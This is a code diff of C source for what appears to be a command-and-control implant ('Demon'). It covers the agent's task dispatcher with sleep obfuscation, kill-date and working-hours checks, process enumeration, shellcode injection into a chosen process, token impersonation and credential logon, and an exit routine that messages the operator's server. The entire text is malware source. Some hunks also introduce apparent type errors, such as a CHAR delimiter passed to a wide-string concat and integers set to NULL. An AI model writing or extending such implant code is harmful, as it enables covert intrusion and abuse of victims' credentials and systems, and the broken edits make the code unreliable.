@@ -63,13 +63,15 @@ VOID CommandDispatcher( VOID )
             break;
         }
 
+        SleepObf();
+
         if ( ReachedKillDate() ) {
             KillDate();
         }
 
-        // Exit immediately if not in working hours - let main loop handle sleep timing
+        // simply call SleepObf until we reach working hours or the kill date (if set)
         if ( ! InWorkingHours() ) {
-            break;
+            continue;
         }
 
 #ifdef TRANSPORT_HTTP
@@ -150,9 +152,6 @@ VOID CommandDispatcher( VOID )
 
         /* push any new clients or output from the sockets */
         SocketPush();
-
-        // Exit after processing tasks to allow proper sleep timing in main loop
-        break;
 
     } while ( TRUE );
 
@@ -616,7 +615,7 @@ VOID CommandProcList(
             }
 
             /* Now we append the collected process data to the process list  */
-            PackageAddBytes( Package, (PBYTE)SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
+            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
             PackageAddInt32( Package, x86 );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
@@ -698,7 +697,7 @@ VOID CommandFS( PPARSER Parser )
             LPWSTR           Ends         = NULL;
             PDIR_OR_FILE     DirOrFile    = NULL;
             PDIR_OR_FILE     TmpDirOrFile = NULL;
-            UINT32           PathSize     = 0;
+            UINT32           PathSize     = NULL;
 
             FileExplorer = ParserGetBool( Parser );
             TargetFolder = ParserGetWString( Parser, NULL );
@@ -1287,8 +1286,8 @@ VOID CommandInjectShellcode(
     Way     = ParserGetInt32( Parser );
     Method  = ParserGetInt32( Parser );
     x64     = ParserGetInt32( Parser );
-    Payload = ParserGetBytes( Parser, (PUINT32)&Size );
-    Argv    = ParserGetBytes( Parser, (PUINT32)&Argc );
+    Payload = ParserGetBytes( Parser, &Size );
+    Argv    = ParserGetBytes( Parser, &Argc );
     Pid     = ParserGetInt32( Parser );
 
     PRINTF(
@@ -1391,10 +1390,7 @@ VOID CommandToken( PPARSER Parser )
             if ( TokenData )
             {
                 PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
-                // Convert wide string to ASCII before adding to package
-                CHAR AsciiBuffer[512] = {0};
-                WCharStringToCharString(AsciiBuffer, TokenData->DomainUser, 512);
-                PackageAddString( Package, AsciiBuffer );
+                PackageAddString( Package, TokenData->DomainUser );
             }
             else
             {
@@ -1542,7 +1538,7 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
             DWORD  LogonType      = ParserGetInt32( Parser );
-            WCHAR  DeliW[2] = { L'\\', 0 };
+            CHAR   Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
             PWCHAR UserDomain     = NULL;
             LPWSTR BufferUser     = NULL;
@@ -1563,7 +1559,7 @@ VOID CommandToken( PPARSER Parser )
                     MemSet( UserDomain, 0, UserDomainSize );
 
                     StringConcatW( UserDomain, lpDomain );
-                    StringConcatW( UserDomain, DeliW );
+                    StringConcatW( UserDomain, Deli );
                     StringConcatW( UserDomain, lpUser );
 
                     BufferUser     = Instance->Win32.LocalAlloc( LPTR, dwUserSize );
@@ -1800,7 +1796,7 @@ VOID CommandAssemblyListVersion( PPARSER Parser )
     PIEnumUnknown    pEnumClr     = { NULL };
     PICLRRuntimeInfo pRunTimeInfo = { NULL };
 
-    if ( Instance->Win32.CLRCreateInstance != NULL )
+    if ( RtMscoree() )
     {
         if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&pClrMetaHost ) == S_OK )
         {
@@ -3343,7 +3339,7 @@ VOID CommandExit( PPARSER Parser )
     if ( Parser )
     {
         /* Send our last message to our server...
-         * "My battery is low, and it's getting dark." */
+         * "My battery is low, and it’s getting dark." */
         Package    = PackageCreate( DEMON_EXIT );
         ExitMethod = ParserGetInt32( Parser );
 
@@ -3473,7 +3469,7 @@ VOID CommandExit( PPARSER Parser )
      */
 
     ImageBase = Instance->Session.ModuleBase;
-    ImageSize = 0;
+    ImageSize = NULL;
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.RtlCaptureContext( &RopExit );
